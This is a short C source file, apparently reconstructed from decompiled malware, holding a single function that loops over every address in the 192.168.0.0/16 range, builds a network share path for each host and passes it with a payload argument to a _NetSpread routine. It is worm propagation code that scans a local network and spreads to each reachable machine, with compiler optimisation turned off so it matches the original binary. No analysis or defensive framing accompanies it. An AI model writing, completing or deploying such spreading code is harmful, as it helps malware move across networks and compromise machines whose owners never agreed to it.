#include "data_globals.h"
#include <string.h>
#include <stdio.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI _L0cal_4(LPVOID Data)
{
    char local_54[64];

    // Loop counter local_10
    volatile uint32_t local_10_buf[2] = {{0, (uint32_t)0}};
    volatile uint32_t *p_local_10 = (volatile uint32_t *)&local_10_buf[0];

    // Loop counter local_14
    volatile uint32_t local_14_buf[2] = {{0, (uint32_t)0}};
    volatile uint32_t *p_local_14 = (volatile uint32_t *)&local_14_buf[0];

    LPCSTR param_1 = (LPCSTR)Data;

    for ((*p_local_10) = 0; (*p_local_10) < 0x100; (*p_local_10)++)
    {
        for ((*p_local_14) = 0; (*p_local_14) < 0x100; (*p_local_14)++)
        {
            memset(local_54, 0, sizeof(local_54));
            sprintf(local_54, "\\\\192.168.%d.%d", (*p_local_10), (*p_local_14));
            _NetSpread((uint32_t)local_54, param_1);
        }
    }
    return 0;
}
#pragma optimize("", on)
